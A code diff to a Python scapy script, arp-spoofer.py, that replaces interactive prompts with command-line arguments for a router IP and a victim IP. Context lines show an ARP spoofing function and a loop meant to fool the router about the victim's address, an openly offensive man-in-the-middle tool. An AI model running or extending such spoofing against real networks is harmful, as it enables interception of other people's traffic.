@@ -1,9 +1,11 @@
 from scapy.all import *
 import time
+import sys
 
 
 MAC_BROADCAST = 'ff:ff:ff:ff:ff:ff'
 ARP_REPLY = 2
+REQUIRED_NUM_OF_ARGS = 3
 
 
 def find_mac(ip: str) -> str:
@@ -30,8 +32,12 @@ def arp_spoof(target_ip: str, spoofed_ip: str, spoofed_mac: str = ''):
 
 
 def main():
-    router_ip = input('Please enter your router ip: ')
-    victim_ip = input('Please enter your victim ip: ')
+    if len(sys.argv) != REQUIRED_NUM_OF_ARGS:
+        print('Usage: python3 arp-spoofer.py [router_ip] [victim_ip]')
+        return
+    
+    _, router_ip, victim_ip = sys.argv
+    
     try:
         while True:
             # fool the router into thinking my pc is the victim pc
